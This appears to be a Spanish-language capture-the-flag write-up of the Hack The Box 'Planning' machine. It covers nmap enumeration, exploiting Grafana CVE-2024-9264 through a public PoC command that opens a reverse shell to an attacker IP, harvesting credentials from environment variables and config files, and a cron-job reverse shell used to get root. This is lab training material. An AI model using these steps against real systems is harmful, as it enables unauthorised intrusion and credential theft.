---
layout: post
title:  "Planning Machine (Easy)"
os: Linux
date:   2024-04-05 17:04:54 +0100
categories: ["OS Command Injection", "Brute Force"]
---

Enumeración de puertos
```java
sudo nmap -sC -sV -p22,80 -Pn -n --open planning.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-13 18:53 CEST
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
```

Enumeración de directorios

![Nmap scan](/assets/machines/planning.htb/images/Pasted%20image%2020250813185055.webp)

Iniciar sesión Granfana
![](/assets/machines/planning.htb/images/Pasted%20image%2020250813185157.webp)

Versión Grafana.

![](/assets/machines/planning.htb/images/Pasted image 20250813185240.webp)

La versión de grafana v11.0.0 es vulnerable al CVE-2024-9264.

[z3k0sec/CVE-2024-9264-RCE-Exploit: Grafana RCE exploit (CVE-2024-9264)](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit?tab=readme-ov-file#description)

Establecer una reverse shell.
```bash
$ python poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.115 --reverse-port 9000
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 9000
```

![](/assets/machines/planning.htb/images/Pasted image 20250813184842.webp)

Una vez dentro somos ``root`` pero de un contenedor de Docker.

Contraseña encontrada: `RioTecRANDEntANT!` usando el comando `env`.

![](/assets/machines/planning.htb/images/2025-08-12_21-04.webp)

Usamos las credenciales `enzo:RioTecRANDEntANT!` para iniciar sesión por SSH.

El fichero `/var/www/web/enroll.php` contiene las credenciales root para la base de datos `root:EXTRapHY`. Pero no nos van a servir para nada.

![](/assets/machines/planning.htb/images/2025-08-12_21-03.webp)

Por otra parte, en `/opt/crontabs/crontab.db` encontraremos unas credenciales `P4ssw0rdS0pRi0T3c`.
![](/assets/machines/planning.htb/images/Pasted image 20250813182828.webp)

Hay un puerto 8000 abierto.
![](/assets/machines/planning.htb/images/Pasted image 20250813183047.webp)

Usar Port Forwarding para llegar al puerto 8000 desde la la máquina atacante.
![](/assets/machines/planning.htb/images/Pasted image 20250813183115.webp)

Iniciar sesión con las credenciales `root:P4ssw0rdS0pRi0T3c`.

![](/assets/machines/planning.htb/images/Pasted image 20250813183014.webp)
Crear un job con una reverse shell.
![](/assets/machines/planning.htb/images/Pasted image 20250813184305.webp)

Clicar en "Run now".

![](/assets/machines/planning.htb/images/Pasted image 20250813184319.webp)

Root txt
![](/assets/machines/planning.htb/images/Pasted image 20250813184355.webp)
